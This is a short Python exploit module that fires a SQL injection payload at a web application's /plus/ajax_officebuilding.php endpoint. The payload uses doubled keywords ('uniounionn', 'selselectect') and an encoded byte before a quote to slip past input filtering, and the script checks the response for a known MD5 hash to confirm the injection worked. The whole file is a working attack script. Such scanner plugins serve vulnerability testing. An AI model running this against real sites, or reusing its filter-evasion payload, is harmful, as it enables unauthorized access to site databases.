import re
import requests


class Exploit:

    def attack(self, url):
        target = url + "/plus/ajax_officebuilding.php?act=key&key=asd%E9%94%A6%27%20uniounionn%20selselectect%201,2,3,md5(7836457),5,6,7,8,9%23"
        r = requests.get(target)
        if r.status_code == 200:
            if "3438d5e3ead84b2effc5ec33ed1239f5" in r.text:
                return target + "has SQL Injection..."
